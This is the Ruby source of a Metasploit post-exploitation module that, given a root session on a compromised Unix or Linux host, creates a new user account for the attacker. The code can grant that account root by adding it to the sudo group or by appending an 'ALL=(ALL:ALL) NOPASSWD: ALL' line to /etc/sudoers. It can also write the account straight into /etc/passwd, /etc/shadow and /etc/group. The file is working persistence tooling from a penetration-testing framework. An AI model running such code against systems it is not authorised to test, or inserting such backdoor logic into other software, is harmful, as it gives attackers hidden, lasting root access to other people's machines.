# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework

require 'unix_crypt'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Add a new user to the system',
        'Description' => %q{
          This command adds a new user to the system
        },
        'License' => MSF_LICENSE,
        'Author' => ['Nick Cottrell <ncottrellweb[at]gmail.com>'],
        'Platform' => ['linux', 'unix', 'bsd', 'aix', 'solaris'],
        'Privileged' => false,
        'SessionTypes' => %w[meterpreter shell],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [CONFIG_CHANGES]
        }
      )
    )
    register_options([
      OptString.new('USERNAME', [ true, 'The username to create', 'metasploit' ]),
      OptString.new('PASSWORD', [ true, 'The password for this user', 'Metasploit$1' ]),
      OptString.new('SHELL', [true, 'Set the shell that the new user will use', '/bin/sh']),
      OptString.new('HOME', [true, 'Set the home directory of the new user. Leave empty if user will have no home directory', '']),
      OptString.new('GROUPS', [false, 'Set what groups the new user will be part of separated with a space'])
    ])

    register_advanced_options([
      OptEnum.new('UseraddMethod', [true, 'Set how the module adds in new users and groups. AUTO will autodetect how to add new users, MANUAL will add users without any binaries, and CUSTOM will attempt to use a custom designated binary', 'AUTO', ['AUTO', 'MANUAL', 'CUSTOM']]),
      OptString.new('UseraddBinary', [false, 'Set binary used to set password if you dont want module to find it for you.'], conditions: %w[UseraddMethod == CUSTOM]),
      OptEnum.new('SudoMethod', [true, 'Set the method that the new user can obtain root. SUDO_FILE adds the user directly to sudoers while GROUP adds the new user to the sudo group', 'GROUP', ['SUDO_FILE', 'GROUP', 'NONE']]),
      OptEnum.new('MissingGroups', [true, 'Set how nonexisting groups are handled on the system. Either give an error in the module, ignore it and throw it out, or create the group on the system.', 'ERROR', ['ERROR', 'IGNORE', 'CREATE']]),
      OptEnum.new('PasswordHashType', [true, 'Set the hash method your password will be encrypted in.', 'MD5', ['DES', 'MD5', 'SHA256', 'SHA512']])
    ])
  end

  # Checks if the given group exists within the system
  def check_group_exists?(group_name, group_data)
    return group_data =~ /^#{Regexp.escape(group_name)}:/
  end

  # Checks if the specified command can be executed by the session. It should be
  # noted that not all commands correspond to a binary file on disk. For example,
  # a bash shell session will provide the `eval` command when there is no `eval`
  # binary on disk. Likewise, a Powershell session will provide the `Get-Item`
  # command when there is no `Get-Item` executable on disk.
  #
  # @param [String] cmd the command to check
  # @return [Boolean] true when the command exists
  def check_command_exists?(cmd)
    command_exists?(cmd)
  rescue RuntimeError => e
    fail_with(Failure::Unknown, "Unable to check if command `#{cmd}' exists: #{e}")
  end

  def d_cmd_exec(command)
    vprint_status(command)
    print_line(cmd_exec(command))
  end

  # Produces an altered copy of the group file with the user added to each group
  def fs_add_groups(group_file, groups)
    groups.each do |group|
      # Add user to group if there are other users
      group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:.+)$/, "\\1,#{datastore['USERNAME']}")
      # Add user to group of no users belong to that group yet
      group_file = group_file.gsub(/^(#{group}:[^:]*:[0-9]+:)$/, "\\1#{datastore['USERNAME']}")
    end
    if datastore['MissingGroups'] == 'CREATE'
      new_groups = get_missing_groups(group_file, groups)
      new_groups.each do |group|
        gid = rand(1000..2000).to_s
        group_file += "\n#{group}:x:#{gid}:#{datastore['USERNAME']}\n"
        print_good("Added #{group} group")
      end
    end
    group_file.gsub(/\n{2,}/, "\n")
  end

  # Provides a list of groups that arent already on the system
  def get_missing_groups(group_file, groups)
    groups.reject { |group| check_group_exists?(group, group_file) }
  end

  # Finds out what platform the module is running on. It will attempt to access
  # the Hosts database before making more noise on the target to learn more
  def os_platform
    if session.type == 'meterpreter'
      sysinfo['OS']
    elsif active_db? && framework.db.workspace.hosts.where(address: session.session_host)&.first&.os_name
      host = framework.db.workspace.hosts.where(address: session.session_host).first
      if host.os_name == 'linux' && host.os_flavor
        host.os_flavor
      else
        host.os_name
      end
    else
      get_sysinfo[:distro]
    end
  end

  # Validates the groups given to it. Depending on datastore settings, it will
  # give a trimmed down list of the groups given to it, and ensure that all
  # groups returned exist on the system.
  def validate_groups(group_file, groups)
    groups = groups.uniq

    # Check that group names are valid
    invalid = groups.filter { |group| group !~ /^[a-zA-Z0-9_.][a-zA-Z0-9_.-]{0,30}[a-zA-Z0-9_.$-]?$/ }
    if invalid.any? && datastore['MissingGroups'] == 'IGNORE'
      groups -= invalid
      vprint_error("The groups [#{invalid.join(' ')}] do not fit accepted characters for groups. Ignoring them instead.")
    elsif invalid.any?
      # Give error even on create, as creating this group will cause errors
      fail_with(Failure::BadConfig, "groups [#{invalid.join(' ')}] Do not fit the authorized regex for groups. Check your groups against this regex /^[a-zA-Z0-9_.][a-zA-Z0-9_.-]{0,30}[a-zA-Z0-9_.$-]?$/")
    end

    # Check to see that groups exist or fail
    groups_missing = get_missing_groups(group_file, groups)
    unless groups_missing.empty?
      if datastore['MissingGroups'] == 'ERROR'
        fail_with(Failure::NotFound, "groups [#{groups_missing.join(' ')}] do not exist on the system. Change the `MissingGroups` Option to deal with errors automatically")
      end
      print_warning("Groups [#{groups_missing.join(' ')}] do not exist on system")
      if datastore['MissingGroups'] == 'IGNORE'
        groups -= groups_missing
        print_good("Removed #{groups_missing.join(' ')} from target groups")
      end
    end

    groups
  end

  # Takes all the groups given and attempts to add them to the system
  def create_new_groups(groups)
    # Since command can add on groups, checking over groups
    groupadd = check_command_exists?('groupadd') ? 'groupadd' : nil
    groupadd ||= 'addgroup' if check_command_exists?('addgroup')
    fail_with(Failure::NotFound, 'Neither groupadd nor addgroup exist on the system. Try running with UseraddMethod as MANUAL to get around this issue') unless groupadd

    groups.each do |group|
      d_cmd_exec("#{groupadd} #{group}")
      print_good("Added #{group} group")
    end
  end

  def run
    fail_with(Failure::NoAccess, 'Session isnt running as root') unless is_root?
    case datastore['UseraddMethod']
    when 'CUSTOM'
      fail_with(Failure::NotFound, "Cannot find command on path given: #{datastore['UseraddBinary']}") unless check_command_exists?(datastore['UseraddBinary'])
    when 'AUTO'
      fail_with(Failure::NotVulnerable, 'Cannot find a means to add a new user') unless check_command_exists?('useradd') || check_command_exists?('adduser')
    end
    fail_with(Failure::NotVulnerable, 'Cannot add user to sudo as sudoers doesnt exist') unless datastore['SudoMethod'] != 'SUDO_FILE' || file_exist?('/etc/sudoers')
    fail_with(Failure::NotFound, 'Shell specified does not exist on system') unless check_command_exists?(datastore['SHELL'])
    fail_with(Failure::BadConfig, "Username [#{datastore['USERNAME']}] is not a legal unix username.") unless datastore['USERNAME'] =~ /^[a-z][a-z0-9_-]{0,31}$/

    # Encrypting password ahead of time
    passwd = case datastore['PasswordHashType']
             when 'DES'
               UnixCrypt::DES.build(datastore['PASSWORD'])
             when 'MD5'
               UnixCrypt::MD5.build(datastore['PASSWORD'])
             when 'SHA256'
               UnixCrypt::SHA256.build(datastore['PASSWORD'])
             when 'SHA512'
               UnixCrypt::SHA512.build(datastore['PASSWORD'])
             end

    # Adding sudo to groups if method is set to use groups
    groups = datastore['GROUPS']&.split || []
    groups += ['sudo'] if datastore['SudoMethod'] == 'GROUP'
    group_file = read_file('/etc/group').to_s
    groups = validate_groups(group_file, groups)

    # Creating new groups if it was set and isnt manual
    if groups.any? && datastore['MissingGroups'] == 'CREATE' && datastore['UseraddMethod'] != 'MANUAL'
      create_new_groups(get_missing_groups(group_file, groups))
    end

    # Automatically ignore setting groups if added additional groups is empty
    groups_handled = groups.empty?

    # Check database to see what OS it is. If it meets specific requirements, This can all be done in a single line
    binary = case datastore['UseraddMethod']
             when 'AUTO'
               if check_command_exists?('useradd')
                 'useradd'
               elsif check_command_exists?('adduser')
                 'adduser'
               else
                 'MANUAL'
               end
             when 'MANUAL'
               'MANUAL'
             when 'CUSTOM'
               datastore['UseraddBinary']
             end
    case binary
    when /useradd$/
      print_status("Running on #{os_platform}")
      print_status('Useradd exists. Using that')
      case os_platform
      when /debian|ubuntu|fedora|centos|oracle|redhat|arch|suse|gentoo/i
        homedirc = datastore['HOME'].empty? ? '--no-create-home' : "--home-dir #{datastore['HOME']}"

        # Since command can add on groups, checking over groups
        groupsc = groups.empty? ? '' : "--groups #{groups.join(',')}"

        # Finally run it
        d_cmd_exec("#{binary} --password \'#{passwd}\' #{homedirc} #{groupsc} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}".gsub(/ {2,}/, ' '))
        groups_handled = true
      else
        vprint_status('Unsure what platform we\'re on. Using useradd in most basic/common settings')

        # Finally run it
        d_cmd_exec("#{binary} #{datastore['USERNAME']} | echo")
        d_cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e")
      end
    when /adduser$/
      print_status("Running on #{os_platform}")
      print_status('Adduser exists. Using that')
      case os_platform
      when /debian|ubuntu/i
        print_warning('Adduser cannot add groups to the new user automatically. Going to have to do it at a later step')
        homedirc = datastore['HOME'].empty? ? '--no-create-home' : "--home #{datastore['HOME']}"

        d_cmd_exec("#{binary} --disabled-password #{homedirc} --shell #{datastore['SHELL']} #{datastore['USERNAME']} | echo")
        d_cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e")
      when /fedora|centos|oracle|redhat/i
        homedirc = datastore['HOME'].empty? ? '--no-create-home' : "--home-dir #{datastore['HOME']}"

        # Since command can add on groups, checking over groups
        groupsc = groups.empty? ? '' : "--groups #{groups.join(',')}"

        # Finally run it
        d_cmd_exec("#{binary} --password \'#{passwd}\' #{homedirc} #{groupsc} --shell #{datastore['SHELL']} --no-log-init #{datastore['USERNAME']}".gsub(/ {2,}/, ' '))
        groups_handled = true
      when /alpine/i
        print_warning('Adduser cannot add groups to the new user automatically. Going to have to do it at a later step')
        homedirc = datastore['HOME'].empty? ? '-H' : "-h #{datastore['HOME']}"

        d_cmd_exec("#{binary} -D #{homedirc} -s #{datastore['SHELL']} #{datastore['USERNAME']}")
        d_cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e")
      else
        print_status('Unsure what platform we\'re on. Using useradd in most basic/common settings')

        # Finally run it
        d_cmd_exec("#{binary} #{datastore['USERNAME']}")
        d_cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e")
      end
    when datastore['UseraddBinary']
      print_status('Running with command supplied')
      d_cmd_exec("#{binary} #{datastore['USERNAME']}")
      d_cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}\'|chpasswd -e")
    else
      # Checking that user doesnt already exist
      fail_with(Failure::BadConfig, 'User already exists') if read_file('/etc/passwd') =~ /^#{datastore['USERNAME']}:/

      # Run adding user manually if set
      home = datastore['HOME'].empty? ? "/home/#{datastore['USERNAME']}" : datastore['HOME']
      uid = rand(1000..2000).to_s
      append_file('/etc/passwd', "#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\n")
      vprint_status("\'#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\' >> /etc/passwd")
      append_file('/etc/shadow', "#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::\n")
      vprint_status("\'#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::\' >> /etc/shadow")

      altered_group_file = fs_add_groups(group_file, groups)
      write_file('/etc/group', altered_group_file) unless group_file == altered_group_file

      groups_handled = true
    end

    # Adding in groups and connecting if not done already
    unless groups_handled
      # Attempt to do add groups to user by normal means, or do it manually
      if check_command_exists?('usermod')
        d_cmd_exec("usermod -aG #{groups.join(',')} #{datastore['USERNAME']}")
      elsif check_command_exists?('addgroup')
        groups.each do |group|
          d_cmd_exec("addgroup #{datastore['USERNAME']} #{group}")
        end
      else
        print_error("Couldnt find \'usermod\' nor \'addgroup\' on the target. User [#{datastore['USERNAME']}] couldnt be linked to groups.")
      end
    end

    # Adding user to sudo file if specified
    if datastore['SudoMethod'] == 'SUDO_FILE' && file_exist?('/etc/sudoers')
      append_file('/etc/sudoers', "#{datastore['USERNAME']} ALL=(ALL:ALL) NOPASSWD: ALL\n")
      print_good("Added [#{datastore['USERNAME']}] to /etc/sudoers successfully")
    end
  rescue Msf::Exploit::Failed
    print_warning("The module has failed to add the new user [#{datastore['USERNAME']}]!")
    print_warning('Groups that were created need to be removed from the system manually.')
    raise
  end
end
